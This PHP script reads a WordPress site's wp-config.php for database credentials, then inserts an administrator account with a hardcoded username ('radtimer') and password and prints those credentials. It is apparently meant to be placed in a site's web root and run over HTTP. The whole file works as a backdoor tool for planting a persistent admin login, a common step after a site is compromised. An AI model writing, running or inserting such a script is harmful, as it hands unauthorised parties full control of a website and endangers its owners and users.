<?php
/**
 * Automated WordPress User Adder
 * Reads wp-config.php, connects to DB, inserts user 'radtimer' with password 'vimash1212'
 * Uses bcrypt hashing (PHP password_hash).
 */

// ------------------------------------------------------------
// 1. Locate and include wp-config.php
// ------------------------------------------------------------
$possiblePaths = [
    __DIR__ . '/wp-config.php',
    dirname(__DIR__) . '/wp-config.php',
    $_SERVER['DOCUMENT_ROOT'] . '/wp-config.php',
    $_SERVER['DOCUMENT_ROOT'] . '/../wp-config.php',
];

$configPath = null;
foreach ($possiblePaths as $path) {
    if (file_exists($path)) {
        $configPath = $path;
        break;
    }
}

if (!$configPath) {
    die("Error: wp-config.php not found in any expected location.");
}

// Prevent WordPress from loading themes/functions (just to be safe)
define('WP_USE_THEMES', false);
require_once($configPath);

// Check if DB constants are defined
if (!defined('DB_NAME') || !defined('DB_USER') || !defined('DB_PASSWORD') || !defined('DB_HOST')) {
    die("Error: Required database constants (DB_NAME, DB_USER, DB_PASSWORD, DB_HOST) are not defined in wp-config.php");
}

// ------------------------------------------------------------
// 2. Connect to the database using PDO
// ------------------------------------------------------------
try {
    $pdo = new PDO(
        "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8mb4",
        DB_USER,
        DB_PASSWORD
    );
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
} catch (PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}

// ------------------------------------------------------------
// 3. Define user details
// ------------------------------------------------------------
$username   = 'radtimer';
$password   = 'vimash1212';
$email      = 'radtimer@example.com';   // Change if needed
$display    = 'radtimer';
$registered = date('Y-m-d H:i:s');

// ------------------------------------------------------------
// 4. Generate bcrypt hash (WordPress compatible)
// ------------------------------------------------------------
$hash = password_hash($password, PASSWORD_DEFAULT);
if ($hash === false) {
    die("Error: Failed to generate password hash.");
}

// ------------------------------------------------------------
// 5. Check if user already exists (by login or email)
// ------------------------------------------------------------
try {
    $checkStmt = $pdo->prepare("SELECT ID FROM wp_users WHERE user_login = ? OR user_email = ?");
    $checkStmt->execute([$username, $email]);
    if ($checkStmt->rowCount() > 0) {
        die("Error: User '{$username}' or email '{$email}' already exists.");
    }
} catch (PDOException $e) {
    die("Error checking existing user: " . $e->getMessage());
}

// ------------------------------------------------------------
// 6. Insert the new user into wp_users
// ------------------------------------------------------------
try {
    $insertSql = "INSERT INTO wp_users 
                  (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name)
                  VALUES (?, ?, ?, ?, ?, 0, ?)";
    $insertStmt = $pdo->prepare($insertSql);
    $insertResult = $insertStmt->execute([$username, $hash, $username, $email, $registered, $display]);

    if (!$insertResult) {
        die("Error: Failed to insert user. " . print_r($insertStmt->errorInfo(), true));
    }

    $userId = $pdo->lastInsertId();
    if (!$userId) {
        die("Error: Could not retrieve new user ID.");
    }
} catch (PDOException $e) {
    die("Database error while inserting user: " . $e->getMessage());
}

// ------------------------------------------------------------
// 7. (Optional) Assign administrator role via wp_usermeta
// ------------------------------------------------------------
try {
    // Administrator capability meta
    $caps = serialize(['administrator' => true]);
    $metaStmt = $pdo->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_capabilities', ?)");
    $metaStmt->execute([$userId, $caps]);

    // Also set user level to 10 (admin)
    $levelStmt = $pdo->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_user_level', ?)");
    $levelStmt->execute([$userId, '10']);
} catch (PDOException $e) {
    // Meta insertion failure is not critical, but we log a warning
    echo "Warning: Could not assign admin role: " . $e->getMessage() . "\n";
}

// ------------------------------------------------------------
// 8. Output success message
// ------------------------------------------------------------
echo "✅ User '{$username}' added successfully with password '{$password}'. (User ID: {$userId})\n";
echo "You can now log in as '{$username}' with that password.";
